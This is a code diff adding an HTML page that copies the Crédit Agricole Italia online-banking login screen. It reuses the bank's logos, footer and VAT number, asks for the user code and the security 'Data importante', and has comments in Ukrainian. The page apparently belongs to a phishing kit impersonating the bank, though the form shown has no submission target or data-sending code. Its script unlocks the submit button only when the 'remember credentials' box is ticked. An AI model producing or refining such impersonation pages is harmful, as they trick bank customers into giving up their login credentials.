@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+  <meta charset="UTF-8">
+  <title>Crédit Agricole - Accesso Home</title>
+
+    <link rel="icon" href="https://media.licdn.com/dms/image/v2/D4E0BAQHGyGl1othM5w/company-logo_200_200/B4EZkEfYAZGoAI-/0/1756716958337/creditagricoleukraine_logo?e=2147483647&v=beta&t=VAiCLfB4IOftH_r0A7ZDeWKvyzGLL2OpLknDMqhbJg8" type="image/x-icon">
+ 
+    <link rel="shortcut icon" href="https://media.licdn.com/dms/image/v2/D4E0BAQHGyGl1othM5w/company-logo_200_200/B4EZkEfYAZGoAI-/0/1756716958337/creditagricoleukraine_logo?e=2147483647&v=beta&t=VAiCLfB4IOftH_r0A7ZDeWKvyzGLL2OpLknDMqhbJg8" type="image/x-icon">
+   <link rel="apple-touch-icon" href="https://media.licdn.com/dms/image/v2/D4E0BAQHGyGl1othM5w/company-logo_200_200/B4EZkEfYAZGoAI-/0/1756716958337/creditagricoleukraine_logo?e=2147483647&v=beta&t=VAiCLfB4IOftH_r0A7ZDeWKvyzGLL2OpLknDMqhbJg8">
+
+  <link rel="stylesheet" href="style.css">
+  <link rel="stylesheet" href="./creditaricole.css">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Montserrat+Alternates:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&family=Montserrat:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body>
+  <!-- Хедер -->
+  <header class="header">
+    <img src="https://nowbanking.credit-agricole.it/assets/images/logo-ca_2.svg" alt="Crédit Agricole">
+  </header>
+
+  <!-- Контейнер -->
+  <main>
+    <div class="panel">
+      <!-- Верх -->
+      <div class="prod-bank-select-buttons-row">
+        <div class="box-product-bank selected">Privati</div>
+        <div class="prod-bank-edit" ><button>MODIFICA</button></div>
+      </div>
+      <div class="panel-heading-separator"></div>
+
+      <!-- Форма -->
+      <form>
+      <!-- Codice Utente/Alias -->
+<label class="label-text" for="user-code">
+    Codice Utente/Alias 
+    <button type="button" class="info-btn" data-modal="modal-utente">i</button>
+  </label>
+  <input type="text" id="user-code" class="form-control field" required>
+  
+  <!-- Modal для Codice Utente/Alias -->
+  <div id="modal-utente" class="modal">
+    <div class="modal-content">
+      <span class="close">&times;</span>
+      <h2>Codice Utente/Alias</h2>
+      <p>
+        Il <b>Codice Utente</b> è un codice numerico di 9 cifre assegnato dalla Banca
+        che puoi trovare nella documentazione contrattuale relativa alla sottoscrizione dei Servizi Digitali.
+        Identifica univocamente la tua utenza e puoi sostituirlo con un Alias dopo aver effettuato l’accesso.
+      </p>
+    </div>
+  </div>
+  
+  <!-- Data importante -->
+ <!-- Data importante -->
+<label class="label-text">
+  Data importante 
+  <button type="button" class="info-btn" data-modal="modal-data">i</button>
+</label>
+
+<!-- Надписи Giorno/Mese/Anno -->
+<div class="date-labels">
+  <span>Giorno</span>
+  <span>Mese</span>
+  <span>Anno</span>
+</div>
+
+<div class="form-login-date-container">
+  <input type="number" id="giorno" placeholder="GG" min="1" max="31" required>
+  
+  <select id="mese" required>
+    <option value="" disabled selected>MM</option>
+    <option value="1">01</option>
+    <option value="2">02</option>
+    <option value="3">03</option>
+    <option value="4">04</option>
+    <option value="5">05</option>
+    <option value="6">06</option>
+    <option value="7">07</option>
+    <option value="8">08</option>
+    <option value="9">09</option>
+    <option value="10">10</option>
+    <option value="11">11</option>
+    <option value="12">12</option>
+  </select>
+  
+  <input type="number" id="anno" placeholder="AAAA" min="1900" max="2099" required>
+</div>
+
+  
+<div class="checkbox-inline-block">
+    <input type="checkbox" id="remember">
+    <label for="remember" class="nb-remember-label">Memorizza le credenziali per il prossimo accesso</label>
+  </div>
+
+  <div class="btn-access-container-sca">
+    <button type="submit" class="btn btn-success" disabled>PROSEGUI</button>
+  </div>
+</form>
+  <!-- Modal для Data importante -->
+  <div id="modal-data" class="modal">
+    <div class="modal-content">
+      <span class="close">&times;</span>
+      <h2>Data importante</h2>
+      <p>
+        La <b>Data importante</b> è quella che hai scelto in fase di registrazione 
+        e viene utilizzata come misura di sicurezza aggiuntiva per accedere ai servizi digitali.
+      </p>
+    </div>
+  </div>
+      </form>
+
+      <!-- Нижні іконки -->
+      <div class="reset-credential-help-row">
+        <div class="help-icon">
+          <img src="https://nowbanking.credit-agricole.it/assets/images/message-circle-new.svg" alt="">
+          <div class="nb-assistence-link-label">Hai bisogno di aiuto?</div>
+        </div>
+        <div class="help-icon">
+          <img src="https://nowbanking.credit-agricole.it/assets/images/reset-new.svg" alt="">
+          <div class="nb-assistence-link-label">Recupera le tue credenziali</div>
+        </div>
+        <div class="help-icon">
+          <img src="https://nowbanking.credit-agricole.it/assets/images/manual-new.svg" alt="">
+          <div class="nb-assistence-link-label">Guida all'accesso</div>
+        </div>
+      </div>
+    </div>
+  </main>
+
+  <!-- Футер -->
+  <footer class="footer">
+    <p>
+      Dati societari | Privacy | Note legali | Trasparenza | Reclami, Ricorsi e conciliazioni
+    </p>
+    <p>
+      Copyright © Crédit Agricole Italia S.p.A. - Tutti i diritti riservati - P.IVA 02113530345
+    </p>
+  </footer>
+  <script>
+    document.querySelectorAll('.info-btn').forEach(btn => {
+      btn.addEventListener('click', () => {
+        document.getElementById(btn.dataset.modal).style.display = 'block';
+      });
+    });
+    
+    document.querySelectorAll('.close').forEach(span => {
+      span.addEventListener('click', () => {
+        span.closest('.modal').style.display = 'none';
+      });
+    });
+    
+    window.addEventListener('click', e => {
+      if (e.target.classList.contains('modal')) {
+        e.target.style.display = 'none';
+      }
+    });
+    </script>
+   <script>
+  // ... існуючий скрипт модальних вікон ...
+  
+  // Новий скрипт для перевірки полів форми
+  document.addEventListener('DOMContentLoaded', () => {
+    const userCodeInput = document.getElementById('user-code');
+    const dayInput = document.getElementById('giorno');
+    const monthSelect = document.getElementById('mese');
+    const yearInput = document.getElementById('anno');
+    const rememberCheckbox = document.getElementById('remember');
+    const proseguiButton = document.querySelector('.btn-success'); // Вибираємо кнопку за класом
+
+    function checkFormValidity() {
+      const isUserCodeFilled = userCodeInput.value.trim() !== '';
+      const isDayFilled = dayInput.value.trim() !== '';
+      const isMonthSelected = monthSelect.value !== '';
+      const isYearFilled = yearInput.value.trim() !== '';
+      const isCheckboxChecked = rememberCheckbox.checked;
+
+      if (isUserCodeFilled && isDayFilled && isMonthSelected && isYearFilled && isCheckboxChecked) {
+        proseguiButton.style.background = '#0A8486';
+        proseguiButton.disabled = false; // Робимо кнопку активною
+      } else {
+        proseguiButton.style.background = '#e5e5e5';
+        proseguiButton.disabled = true; // Робимо кнопку неактивною
+      }
+    }
+
+    // Додаємо слухачі подій до всіх полів
+    userCodeInput.addEventListener('input', checkFormValidity);
+    dayInput.addEventListener('input', checkFormValidity);
+    monthSelect.addEventListener('change', checkFormValidity);
+    yearInput.addEventListener('input', checkFormValidity);
+    rememberCheckbox.addEventListener('change', checkFormValidity);
+    
+    // Перевіряємо стан форми при завантаженні сторінки
+    checkFormValidity();
+  });
+</script>
+</body>
+</html>
